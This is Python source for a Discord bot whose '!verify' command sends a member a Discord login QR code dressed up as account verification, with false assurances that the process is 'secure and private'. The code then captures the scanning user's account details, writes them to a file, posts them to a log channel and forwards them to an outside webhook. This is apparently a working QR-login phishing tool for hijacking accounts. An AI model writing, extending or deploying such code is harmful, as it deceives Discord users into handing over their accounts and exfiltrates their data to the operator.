"""
Discord Bot for QR Login System
Command: !verify
"""

import discord
from discord.ext import commands
import asyncio
import os
import threading
import json
import time
from datetime import datetime

# Import QR login system
from qr_login import DiscordAuthWebsocket, DiscordUser
import config

# Global state
active_sessions = {}
bot_ready = False

# Setup intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix=config.BOT_PREFIX,
    intents=intents,
    help_command=None
)

class QRSession:
    def __init__(self, target_user, ctx):
        self.target_user = target_user
        self.ctx = ctx
        self.auth_ws = None
        self.qr_path = None
        self.user_info = None
        self.started_at = datetime.now()
        self.status = "initializing"
        self.thread = None
    
    def start(self):
        """Start QR generation in a separate thread"""
        self.thread = threading.Thread(target=self._run_auth, daemon=True)
        self.thread.start()
    
    def _run_auth(self):
        """Run the authentication websocket"""
        self.status = "generating_qr"
        self.auth_ws = DiscordAuthWebsocket(bot_mode=True)
        self.auth_ws.run()
        
        # Store results
        if self.auth_ws.qr_code_path:
            self.qr_path = self.auth_ws.qr_code_path
        if self.auth_ws.user:
            self.user_info = self.auth_ws.user
    
    def stop(self):
        """Stop the session"""
        if self.auth_ws and self.auth_ws.ws:
            self.auth_ws.ws.close()
        self.status = "stopped"

@bot.event
async def on_ready():
    """Called when bot is ready"""
    global bot_ready
    bot_ready = True
    
    print(f"✅ Bot logged in as {bot.user.name}")
    print(f"🆔 Bot ID: {bot.user.id}")
    print(f"📡 Serving {len(bot.guilds)} guild(s)")
    print("-" * 50)
    
    # Set status
    activity = discord.Activity(
        type=discord.ActivityType.watching,
        name=f"for {config.BOT_PREFIX}verify"
    )
    await bot.change_presence(activity=activity)

@bot.event
async def on_command_error(ctx, error):
    """Handle command errors"""
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing required argument. Use `{config.BOT_PREFIX}help` for usage.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"❌ Invalid argument. Use `{config.BOT_PREFIX}help` for usage.")
    else:
        await ctx.send(f"❌ An error occurred: {str(error)[:100]}")
        print(f"Error in command {ctx.command}: {error}")

@bot.command(name='verify')
async def verify_cmd(ctx, target_user: discord.Member = None):
    """
    Generate a QR code for Discord login verification
    
    Usage:
      !verify              - Send QR code to yourself
      !verify @username    - Send QR code to mentioned user
    """
    # Check if user is authorized
    if config.ADMIN_ONLY and ctx.author.id not in config.ADMIN_IDS:
        await ctx.send("❌ This command is only available to administrators.")
        return
    
    # Check if there's already an active session
    session_id = ctx.guild.id if ctx.guild else ctx.author.id
    if session_id in active_sessions:
        session = active_sessions[session_id]
        if session.status in ["generating_qr", "waiting_scan"]:
            await ctx.send("❌ There's already an active verification session. Please wait for it to complete.")
            return
    
    # Determine target user
    if not target_user:
        target_user = ctx.author
    
    # Check if bot can DM the user
    try:
        # Try to send a test message
        await target_user.send("🔐 Discord verification process starting...")
    except discord.Forbidden:
        await ctx.send(f"❌ I cannot send direct messages to {target_user.mention}. Please enable DMs from server members.")
        return
    
    # Create new session
    session = QRSession(target_user, ctx)
    active_sessions[session_id] = session
    
    # Send initial message
    embed = discord.Embed(
        title="🔐 Discord Verification",
        description=f"Starting verification process for {target_user.mention}",
        color=0x7289da
    )
    embed.add_field(name="Step 1", value="Generating QR code...", inline=False)
    embed.add_field(name="Step 2", value="Scan with Discord mobile app", inline=False)
    embed.add_field(name="Step 3", value="Complete login on your phone", inline=False)
    embed.set_footer(text="This process is secure and private")
    
    status_msg = await ctx.send(embed=embed)
    
    # Start QR generation
    session.start()
    
    # Wait for QR code generation (polling)
    for _ in range(30):  # 30 seconds timeout
        await asyncio.sleep(1)
        
        if session.qr_path and os.path.exists(session.qr_path):
            # Update status
            embed.set_field_at(0, name="Step 1", value="✅ QR code generated!", inline=False)
            await status_msg.edit(embed=embed)
            
            # Send QR code via DM
            try:
                with open(session.qr_path, 'rb') as f:
                    file = discord.File(f, filename="discord_verify_qr.png")
                    dm_embed = discord.Embed(
                        title="🔐 Discord Verification QR Code",
                        description="**Scan this QR code with Discord mobile app to verify your account**",
                        color=0x7289da
                    )
                    dm_embed.set_image(url="attachment://discord_verify_qr.png")
                    dm_embed.add_field(name="Instructions", value="1. Open Discord mobile app\n2. Tap your profile picture\n3. Tap 'Scan QR Code'\n4. Scan this code", inline=False)
                    dm_embed.set_footer(text="This QR code expires in 2 minutes")
                    
                    await target_user.send(embed=dm_embed, file=file)
                
                # Update status
                embed.set_field_at(1, name="Step 2", value="✅ QR code sent to DMs!", inline=False)
                embed.set_field_at(2, name="Step 3", value="⏳ Waiting for scan...", inline=False)
                await status_msg.edit(embed=embed)
                
                # Also send to log channel if configured
                if config.LOG_CHANNEL_ID:
                    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
                    if log_channel:
                        with open(session.qr_path, 'rb') as f:
                            file = discord.File(f, filename="discord_verify_qr.png")
                            await log_channel.send(
                                f"🔐 Verification QR generated for {target_user.mention} (ID: {target_user.id})",
                                file=file
                            )
                
                # Wait for login completion
                session.status = "waiting_scan"
                for _ in range(120):  # 2 minute timeout
                    await asyncio.sleep(1)
                    
                    if session.user_info:
                        # Login successful!
                        embed.set_field_at(2, name="Step 3", value="✅ Verification complete!", inline=False)
                        embed.color = 0x00ff00
                        embed.title = "✅ Verification Successful"
                        await status_msg.edit(embed=embed)
                        
                        # Send success message
                        success_embed = discord.Embed(
                            title="✅ Verification Successful",
                            description=f"Hello {session.user_info.username}!",
                            color=0x00ff00
                        )
                        success_embed.add_field(name="Username", value=f"{session.user_info.username}#{session.user_info.discrim}", inline=True)
                        success_embed.add_field(name="User ID", value=session.user_info.id, inline=True)
                        success_embed.add_field(name="Verified", value="✅ Yes", inline=True)
                        
                        if session.user_info.avatar_hash:
                            success_embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{session.user_info.id}/{session.user_info.avatar_hash}.png")
                        
                        success_embed.set_footer(text="Your account has been verified successfully")
                        
                        await ctx.send(embed=success_embed)
                        
                        # Send webhook notification
                        if config.WEBHOOK_URL:
                            try:
                                from qr_login import send_to_webhook
                                send_to_webhook(session.user_info)
                            except:
                                pass
                        
                        # Save user info to file
                        filename = f"verification_{session.user_info.id}.txt"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(session.user_info.pretty_print())
                        
                        # Send to log channel
                        if config.LOG_CHANNEL_ID:
                            log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
                            if log_channel:
                                log_embed = discord.Embed(
                                    title="✅ New Verification",
                                    description=f"User verified successfully",
                                    color=0x00ff00,
                                    timestamp=datetime.now()
                                )
                                log_embed.add_field(name="User", value=f"{session.user_info.username}#{session.user_info.discrim}", inline=True)
                                log_embed.add_field(name="ID", value=session.user_info.id, inline=True)
                                log_embed.add_field(name="Verifier", value=ctx.author.mention, inline=True)
                                await log_channel.send(embed=log_embed)
                        
                        # Cleanup
                        del active_sessions[session_id]
                        return
                
                # Timeout
                embed.set_field_at(2, name="Step 3", value="❌ Verification timed out", inline=False)
                embed.color = 0xff0000
                embed.title = "❌ Verification Failed"
                await status_msg.edit(embed=embed)
                await ctx.send(f"❌ Verification timed out for {target_user.mention}. The QR code has expired.")
                
                # Cleanup
                del active_sessions[session_id]
                return
                
            except Exception as e:
                await ctx.send(f"❌ Error sending QR code: {e}")
                del active_sessions[session_id]
                return
    
    # QR generation timeout
    embed.set_field_at(0, name="Step 1", value="❌ QR generation failed", inline=False)
    embed.color = 0xff0000
    await status_msg.edit(embed=embed)
    await ctx.send("❌ Failed to generate QR code. Please try again.")
    del active_sessions[session_id]

@bot.command(name='verifystatus')
async def verifystatus_cmd(ctx):
    """Check current verification session status"""
    session_id = ctx.guild.id if ctx.guild else ctx.author.id
    
    if session_id in active_sessions:
        session = active_sessions[session_id]
        
        embed = discord.Embed(
            title="🔐 Verification Status",
            color=0x7289da
        )
        embed.add_field(name="Target User", value=session.target_user.mention, inline=True)
        embed.add_field(name="Status", value=session.status, inline=True)
        embed.add_field(name="Started", value=session.started_at.strftime("%H:%M:%S"), inline=True)
        
        if session.user_info:
            embed.add_field(name="Verified User", value=f"{session.user_info.username}#{session.user_info.discrim}", inline=False)
        
        await ctx.send(embed=embed)
    else:
        await ctx.send("✅ No active verification sessions.")

@bot.command(name='verifycancel')
async def verifycancel_cmd(ctx):
    """Cancel current verification session"""
    session_id = ctx.guild.id if ctx.guild else ctx.author.id
    
    if session_id in active_sessions:
        session = active_sessions[session_id]
        session.stop()
        del active_sessions[session_id]
        await ctx.send("✅ Verification session cancelled.")
    else:
        await ctx.send("❌ No active verification session to cancel.")

@bot.command(name='verifyhelp')
async def verifyhelp_cmd(ctx):
    """Show help for verification commands"""
    embed = discord.Embed(
        title="🔐 Verification Commands Help",
        color=0x7289da
    )
    
    embed.add_field(
        name=f"{config.BOT_PREFIX}verify [@user]",
        value="Start verification process. If no user is mentioned, verifies yourself.",
        inline=False
    )
    
    embed.add_field(
        name=f"{config.BOT_PREFIX}verifystatus",
        value="Check current verification status",
        inline=False
    )
    
    embed.add_field(
        name=f"{config.BOT_PREFIX}verifycancel",
        value="Cancel current verification session",
        inline=False
    )
    
    embed.add_field(
        name=f"{config.BOT_PREFIX}verifyhelp",
        value="Show this help message",
        inline=False
    )
    
    embed.set_footer(text="Verification is secure and only visible to you")
    
    await ctx.send(embed=embed)

async def main():
    """Main async function to run the bot"""
    # Import keep_alive if configured
    if config.USE_KEEP_ALIVE:
        try:
            from keep_alive import keep_alive
            keep_alive()
            print("✅ Keep-alive server started")
        except ImportError:
            print("⚠️ Keep-alive module not found")
    
    # Run the bot
    print(f"🤖 Starting bot with token: {'*' * len(config.BOT_TOKEN) if config.BOT_TOKEN else 'NOT SET'}")
    
    if not config.BOT_TOKEN or config.BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Bot token not configured!")
        print("Please edit config.py and add your bot token")
        return
    
    try:
        await bot.start(config.BOT_TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid bot token! Please check your config.py")
    except Exception as e:
        print(f"❌ Error starting bot: {e}")

if __name__ == "__main__":
    asyncio.run(main())
